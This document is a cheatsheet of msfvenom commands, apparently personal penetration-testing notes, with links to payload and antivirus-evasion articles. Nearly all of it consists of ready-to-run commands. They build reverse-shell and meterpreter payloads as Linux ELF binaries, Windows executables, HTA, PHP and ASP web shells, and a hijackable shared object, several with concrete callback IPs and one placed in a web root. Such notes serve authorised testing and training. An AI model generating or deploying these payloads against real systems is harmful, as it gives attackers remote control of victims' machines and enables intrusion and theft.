Payload Cheatsheet:

https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/msfvenom

https://web.archive.org/web/20220314040948/https://netsec.ws/?p=331

AV Bypass Articles:

https://securityboulevard.com/2020/02/evading-antivirus-with-better-meterpreter-payloads/

## Generic Payloads:
```
msfvenom -p cmd/unix/reverse_bash LHOST=192.168.49.208 LPORT=4444-f raw > shell.sh
```

Linux:(Staged)
```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf
msfvenom -p linux/x86/shell/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf
msfvenom -p linux/x64/shell/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf
```

(Inline)
```
msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf
mfsvenom -p linux/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf
msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf
```

## Windows(Reverse Shells):

(PowerShell)
```
msfvenom -p windows/x64/powershell_reverse_tcp LHOST=172.16.169.198 LPORT=4444 -f exe > reverse.exe
msfvenom -p windows/powershell_reverse_tcp LHOST=172.16.169.198 LPORT=4444 -f exe > reverse.exe
```

(Inline)
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=172.16.169.198 LPORT=4444 -f exe > reverse.exe
msfvenom -p windows/shell_reverse_tcp LHOST=172.16.169.198 LPORT=4444 -f exe > reverse.exe
```

(Staged)
```
msfvenom -p windows/x64/shell/reverse_tcp LHOST=172.16.169.198 LPORT=4444 -f exe > reverse.exe
msfvenom -p windows/shell/reverse_tcp LHOST=172.16.169.198 LPORT=4444 -f exe > reverse.exe
```



## Web Payloads:

HTA Payloads
```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.204 LPORT=4444 -f hta-psh -o /var/www/html/evil.hta
```

PHP Payloads
```
msfvenom -p php/reverse_php LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php
msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php
```

ASP Payloads
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp
```

## Hijacking shared objects:
```
msfvenom -a x64 -p linux/x64/shell_reverse_tcp LHOST=<attacker IP> LPORT=<attacker LPORT> -f elf-so -o program_name.so
```

## Meterpreter Payloads:

(Windows)

(Staged)
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.169.198 LPORT=4444 -f exe > reverse.exe
msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.169.198 LPORT=4444 -f exe > reverse.exe
```

(Inline)
```
msfvenom -p  windows/x64/meterpreter_reverse_tcp LHOST=172.16.169.198 LPORT=4444 -f exe > reverse.exe
msfvenom -p windows/meterpreter_reverse_tcp  LHOST=172.16.169.198 LPORT=4444 -f exe > reverse.exe
```

Encrypted shells:

(staged)
```
msfvenom -p windows/encrypted_shell/reverse_tcp LHOST=172.16.169.198 LPORT=4444 -f exe > reverse.exe
```

(Inline)
```
msfvenom -p windows/encrypted_shell_reverse_tcp LHOST=172.16.169.198 LPORT=4444 -f exe > reverse.exe
```
